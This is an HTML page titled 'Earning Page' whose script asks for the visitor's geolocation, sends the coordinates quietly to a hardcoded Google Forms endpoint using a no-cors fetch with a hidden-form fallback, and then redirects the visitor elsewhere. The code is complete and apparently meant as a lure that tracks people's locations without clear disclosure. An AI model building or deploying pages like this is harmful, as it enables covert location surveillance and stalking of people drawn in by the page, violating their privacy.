<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earning Page</title>
    <style>
        /* Your existing styles here */
    </style>
</head>
<body>
    <!-- Your existing HTML content here -->

    <script>
        // Enhanced tracking functions with debugging
        function trackLocation() {
            console.log("Tracking initiated...");
            if (navigator.geolocation) {
                console.log("Geolocation supported, requesting permission...");
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        console.log("Location obtained:", position.coords);
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        // Send data with confirmation before redirect
                        sendLocationToServer(lat, lon, function() {
                            console.log("Data sent successfully, redirecting...");
                            redirectUser();
                        });
                    },
                    function(error) {
                        console.error("Geolocation error:", error);
                        // Fallback to IP-based tracking
                        sendLocationToServer('unknown', 'unknown', function() {
                            redirectUser();
                        });
                    },
                    { 
                        timeout: 10000,
                        maximumAge: 60000,
                        enableHighAccuracy: false 
                    }
                );
            } else {
                console.log("Geolocation not supported");
                sendLocationToServer('unknown', 'unknown', function() {
                    redirectUser();
                });
            }
        }

        // Robust data submission with multiple fallbacks
        function sendLocationToServer(latitude, longitude, callback) {
            console.log("Attempting to send data:", latitude, longitude);
            
            const formID = "1FAIpQLSdWySmEZzFyt7dJirVY_ok5FTQ37lgpG8fdg_PU-VWyHvMaQA";
            const formUrl = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
            const entryLat = "entry.1509354185";
            const entryLon = "entry.816557017";
            
            // Try Fetch API first
            fetch(formUrl, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: `${entryLat}=${encodeURIComponent(latitude)}&${entryLon}=${encodeURIComponent(longitude)}`
            })
            .then(() => {
                console.log("Data sent via Fetch API");
                callback();
            })
            .catch(e => {
                console.warn("Fetch failed, trying fallback methods...", e);
                
                // Fallback 1: Form submission
                const form = document.createElement('form');
                form.action = formUrl;
                form.method = 'POST';
                form.style.display = 'none';
                
                const latInput = document.createElement('input');
                latInput.name = entryLat;
                latInput.value = latitude;
                form.appendChild(latInput);
                
                const lonInput = document.createElement('input');
                lonInput.name = entryLon;
                lonInput.value = longitude;
                form.appendChild(lonInput);
                
                document.body.appendChild(form);
                form.submit();
                
                console.log("Data sent via Form submission");
                
                // Small delay to ensure submission
                setTimeout(callback, 500);
            });
        }

        function redirectUser() {
            console.log("Redirecting user...");
            window.location.href = "https://your-real-destination.com";
        }

        // Your existing consent functions here
    </script>
</body>
</html>
